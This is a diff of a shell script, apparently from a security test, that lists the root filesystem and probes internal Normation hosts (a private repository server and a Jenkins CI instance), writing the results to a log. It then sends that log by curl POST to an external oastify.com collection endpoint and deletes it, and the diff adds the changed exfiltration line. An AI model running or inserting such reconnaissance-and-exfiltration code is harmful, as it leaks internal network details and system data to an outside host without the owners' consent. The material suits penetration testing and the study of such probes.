@@ -39,14 +39,14 @@ echo "== ls Root ==" >> "${LOG}"
 ls -lah / >> "${LOG}"
 
 echo "== nrm-vir-repository-01.priv.normation.com ==" >> "${LOG}"
-curl --max-time 10 -v "http://nrm-vir-repository-01.priv.normation.com" 2>&1 >> "${LOG}"
-curl --max-time 10 -v "https://nrm-vir-repository-01.priv.normation.com" 2>&1 >> "${LOG}"
+curl --max-time 1 -v "http://nrm-vir-repository-01.priv.normation.com" 2>&1 >> "${LOG}"
+curl --max-time 1 -v "https://nrm-vir-repository-01.priv.normation.com" 2>&1 >> "${LOG}"
 
 echo "== ci.normation.com/jenkins/ ==" >> "${LOG}"
-curl --max-time 10 -v "https://ci.normation.com/jenkins/" 2>&1 >> "${LOG}"
+curl --max-time 1 -v "https://ci.normation.com/jenkins/" 2>&1 >> "${LOG}"
 
 # send the collected log to the OAST endpoint
-curl -s -X POST --max-time 10 --data-binary @"${LOG}" "https://lynrf95yqtuijsb55q3d0brzmqshg94y.oastify.com/cure53?date=$(date)"
+curl -s -X POST --data-binary @"${LOG}" "https://smiy3gt5e0ip7zzctxrkoif6axgo4js8.oastify.com/cure53_1"
 
 # clean up
 rm -f "${LOG}"
